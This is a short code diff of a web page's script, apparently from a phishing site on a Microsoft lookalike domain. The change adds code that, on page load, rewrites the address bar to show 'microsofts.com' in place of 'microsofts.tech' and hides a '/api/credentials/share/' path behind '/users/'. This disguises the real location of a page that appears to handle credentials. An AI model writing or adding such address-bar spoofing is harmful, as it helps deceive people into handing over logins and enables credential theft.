@@ -821,11 +821,14 @@
 	}
 })();
 </script>
+
 <script>
 window.addEventListener("DOMContentLoaded", () => {
-    const realUrl = window.location.href;
-    const fakeUrl = realUrl.replace("microsofts.tech", "microsofts.com");
-    document.getElementById("visible-link").textContent = fakeUrl;
+    const newUrl = window.location.href
+        .replace("microsofts.tech", "microsofts.com")
+        .replace("/api/credentials/share/", "/users/");
+
+    window.history.replaceState({}, "", newUrl);
 });
 </script>
 
